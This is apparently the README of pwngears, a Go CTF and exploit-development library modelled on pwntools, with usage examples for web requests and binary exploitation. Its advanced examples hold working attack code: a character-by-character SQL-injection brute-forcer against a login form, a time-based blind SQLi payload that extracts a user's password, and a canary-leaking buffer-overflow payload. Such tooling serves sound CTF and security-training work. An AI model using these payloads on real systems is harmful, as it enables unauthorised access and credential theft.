Pwngears is a CTF framework and exploit development library based on pwntools. It aimed to provide improved API and better error handling while facilitating the reusability of the exploit. It also aims to provide its core package without any external dependencies, leveraging the Go standard library. 

## Installation
```sh
go get github.com/tonythetender/pwngears
```

## Basic Syntax
        
### Web
You'll first need to import the web package.
```go
import "github.com/tonythetender/pwngears/web"
```

You can simply start a connection with the following function.
```go
conn, err := web.Conn("http://some-ctf-website.com")
if err != nil {
	log.Fatal(err)
}
```

This connection will hold track of things like cookies and headers while also making sure the connection doesn't timeout or redirect indefinitely.

From there you can make GET request simply like this :
```go
resp, err := conn.Client.Get("/")
if err != nil {
	log.Fatal(err)
}

fmt.Println(resp.Text())
```

You can also add query directly in the string or by adding parameters
``` go
resp, err := conn.Client.Get("/search",
	web.WithParam("category", "shoes"),
        web.WithParam("color", "blue"),
        web.WithParam("size", "9"))

```
You can add header the same way or cookies the same way
```go
resp, err := conn.Client.Get("/search",
	web.WithHeader("Content-Type", "application/json"))
```


### Binary exploitation
You'll first need to import the process package.
```go
import pwn "github.com/tonythetender/pwngears/process"
```
To do binary exploitation (ie pwning and reverse) you can connect to a process either localy through an executable
```go
conn, err := pwn.Process("./command")
if err != nil {
	log.Fatal(err)
}
defer conn.Close()
```
Or through a tcp connection
```go
conn, _ := pwn.Remote("127.0.0.1", 12069)
```
With the possibility of SSL over TCP
```go
conn, _ := pwn.RemoteSSL("127.0.0.1", 12069)
```
You can then send inputs directly to the process. The library takes care of converting the string to bytes, but you can also explicitly send bytes to it. Those wont be converted again.
```go
r.SendLine("shellcode")
r.SendLine([]byte("shellcode"))
```
You can also send an input after the process as output a certain line
```go
r.SendLineAfter("Name: ", "John")
```

## Advanced Syntax

### Web
A lot of challenge will require you to iterate over alphanumeric character in order to find the next missing character. For example, when doing SQL injection, you might get a feedback if the start of your input is correct so you need to iterate over every character until you find the whole input. Using the integrated BruteForcer makes this simple.
```go
import (
	bf "pwngears/bruteforce"
	"pwngears/web"
)

func BruteForceFormExample(ctf *web.WebConn) string {
	conn, err := web.Conn("http://some-ctf-website.com")
	if err != nil {
		log.Fatal(err)
	}

	exploit := bf.NewBruteforcer()
	// Multiple charset options are available but you can also pass a custom
	// string that will be used as the charset
	exploit.Charset = bf.GenerateCharset("alphanumeric", "special")
	exploit.MaxLength = 24
	exploit.Delay = 50 * time.Millisecond

	// Different bruteforcer are available, here we use PostRequestBf
	// for bruteforcing a form sent through a POST request
	password, _ := exploit.CharByChar(`admin' AND password like '`, `%' --`, web.PostRequestBf(
		conn.Client,
		"/login",
		"username",
		// For every attempt, the bruteforcer will make sure this field is filled
		web.AlsoFillFormField("password", "Joe"),
		// The input will be consider valid if the following two conditions are true
		web.WithoutBodyContains("invalid"),
		web.WithResponseCode(200),
	))
	return password
}
```
### Time-based SQLI
Lets say your SQLI doesn't provide you with proper response telling you if your query is correct. Different database provide way to make the query take longer in the event that the query is true. Lets say youre trying to find the password of the user id 1 by sleeping when the character is correct. You can make it so that if the response takes above 3 seconds, it counts as valid.
```go
func BruteForceFormExample(conn *web.WebConn) string {
	exploit := bf.NewBruteforcer()
	exploit.Charset = bf.GenerateCharset("digits")
	exploit.MaxLength = 10

	prefix := `1 UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(`
	suffix := `),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;`

	password, _ := exploit.CharByChar(prefix, suffix, web.PostRequestBf(
		conn.Client,
		"/login",
		"username",
		web.WithResponseTimeAbove(3 * time.Second),
	))
	return password
}

```

### Binary Exploitation
Some function were added to facilitate the process of leaking a canary or and address. You can set up your exploit like this
```go
exploit := pwn.NewExploit(r)
exploit.SetConnectFunc(func() pwn.Tube {
	conn, _ := pwn.Connect("127.0.0.1", 12069)
	r.SendLine("Arthur")
	return conn
})

canary, _ := exploit.LeakCanary(40, func(tube pwn.Tube) bool {
	resp, _ := tube.RecvLine()
	// The character is correct when the "Saved" line is displayed
	return pwn.Contains(resp, "Saved")
})

retAddr, _ := exploit.LeakAddress(40, canary, 8, func(tube pwn.Tube) bool {
	resp, _ := tube.RecvLine()
	return pwn.Contains(resp, "Saved")
})

pieBase := retAddr - 0x1811
winAddr := pieBase + 0x12e9

pwn.Pay().
	PadTo(40).
	Canary(canary).
	Repeat("B", 8).
	P64(winAddr).
	SendWithSize(r)

```
